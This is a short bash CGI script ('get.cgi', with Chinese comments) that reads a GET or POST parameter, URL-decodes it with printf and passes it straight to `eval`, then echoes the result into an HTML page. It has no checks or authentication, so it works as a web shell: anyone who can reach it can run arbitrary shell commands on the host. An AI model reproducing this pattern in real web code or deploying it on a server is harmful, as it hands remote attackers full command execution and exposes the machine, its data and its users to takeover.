#!/bin/bash
#get.cgi
echo "content-type:text/html;charset=utf-8"
echo

#include html code
echo "<html>"
echo "<head>"
echo "<style>"

echo "</style>"
echo "</head>"

echo "<body>"

echo "<pre>"

if [ $REQUEST_METHOD = 'POST' ]
then
    # cat - 等着接收POST提交数据
    QUERY_STRING=`cat -`
fi

# get 地址栏参数
qs=$QUERY_STRING

code=`echo $qs|sed 's/=/ /g'|awk '{print $2}'|sed 's/+/ /g'|sed -e 's/%\(\)/\\\x/g'`

code=`printf "${code}"`

#执行
eval $code
echo $code


# printf 格式化输出
#eval 将表达式直接执行


echo "</pre>"

echo "</body>"
echo "</html>"